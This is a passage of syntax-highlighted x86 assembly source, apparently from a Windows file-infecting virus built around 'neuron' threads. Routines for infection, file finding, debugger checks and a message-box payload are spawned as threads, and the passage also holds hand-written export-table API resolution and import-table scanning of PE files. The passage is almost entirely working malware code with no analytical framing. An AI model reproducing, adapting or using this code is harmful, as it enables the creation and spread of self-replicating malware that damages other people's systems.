    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">szMsgTitle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">szMsgText</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">;display message box</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddFreeLibrary</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">end_payload</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Neuron_PayLoad</span><span class="sc0">  </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Neuron_Init</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc5">n1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;suspend neurons</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nDebugger_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nFind_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nCheck_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nInfect_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nOpenFile_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nCloseFile_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nVersion_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">;resume first neuron</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddThreadID</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;create all threads/neurons</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">StartOfNeurons</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NHandles</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">num_of_neurons</span><span class="sc0">

</span><span class="sc5">InitNeurons</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">n2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCreateThread</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;create thread</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">t1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">init_er</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">InitNeurons</span><span class="sc0">                    </span><span class="sc1">;ECX times</span><span class="sc0">
</span><span class="sc5">init_er</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Neuron_Init</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Neuron_GMH</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">        </span><span class="sc1">;dendrits:  EAX - address of GMHW</span><span class="sc0">
                </span><span class="sc1">;       ECX - address of GMHA</span><span class="sc0">
                </span><span class="sc1">;axon   :   ECX - module handle</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0">                    </span><span class="sc1">;add Image Base</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">try_gmhW</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">szk32a</span><span class="sc0">
</span><span class="sc5">K32</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'KERNEL32'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szk32a</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;GetModuleHandleA API call</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">try_gmhW</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">gmh_er</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">szk32w</span><span class="sc0">
</span><span class="sc5">K32W</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc12">'K'</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc12">'R'</span><span class="sc4">,</span><span class="sc12">'N'</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc12">'L'</span><span class="sc4">,</span><span class="sc12">'3'</span><span class="sc4">,</span><span class="sc12">'2'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szk32w</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;GetModuleHandleW API call</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">gmh_er</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Neuron_GMH</span><span class="sc0">  </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Neuron_GPA</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">        </span><span class="sc1">;dendrits:  EAX - module handle</span><span class="sc0">
                </span><span class="sc1">;       ESI - address of API strings</span><span class="sc0">
                </span><span class="sc1">;       EDI - address of API addresses</span><span class="sc0">
                </span><span class="sc1">;axon   :   ECX = 0, if error</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">n_gpa</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">                 </span><span class="sc1">;get API address</span><span class="sc0">
</span><span class="sc5">t2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">gpa_er</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">;store address</span><span class="sc0">
    </span><span class="sc5">@endsz</span><span class="sc0">                          </span><span class="sc1">;end string</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">                </span><span class="sc1">;end of APIs ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">n_gpa</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">gpa_er</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                        </span><span class="sc1">;error, ECX=0</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetProcAddress</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Proc_Address_not_found</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_Size</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">Proc_Address_not_found</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.ED_AddressOfNames</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.ED_NumberOfNames</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">n3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">Search_for_API_name</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Next_Char_in_API_name</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Matched_char_in_API_name</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">Search_for_API_name</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">Proc_Address_not_found</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">n4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">End_MyGetProcAddress</span><span class="sc0">
</span><span class="sc5">Matched_char_in_API_name</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Next_Char_in_API_name</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.ED_AddressOfOrdinals</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Check_Index</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.ED_NumberOfFunctions</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">Proc_Address_not_found</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.ED_AddressOfFunctions</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Proc_Address_not_found</span><span class="sc0">
</span><span class="sc5">End_MyGetProcAddress</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Neuron_GPA</span><span class="sc0">  </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">GetProcAddressIT</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">   </span><span class="sc1">;dendrits:  EAX - API name</span><span class="sc0">
            </span><span class="sc1">;       ECX - lptr to PE header</span><span class="sc0">
            </span><span class="sc1">;       EDX - module name</span><span class="sc0">
            </span><span class="sc1">;axon:      EAX - RVA pointer to IAT, 0 if error</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">n5</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_FileHeader.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_FileHeader.FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_OptionalHeader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">scan_sections</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">section_found</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">scan_sections</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">End_GetProcAddressIT2</span><span class="sc0">
</span><span class="sc5">section_found</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">End_GetProcAddressIT2</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc5">Get_DLL_Name</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.esi.ID_Name</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">End_GetProcAddressIT2</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">IMAGE_SIZEOF_IMPORT_DESCRIPTOR</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Next_Char_from_DLL</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
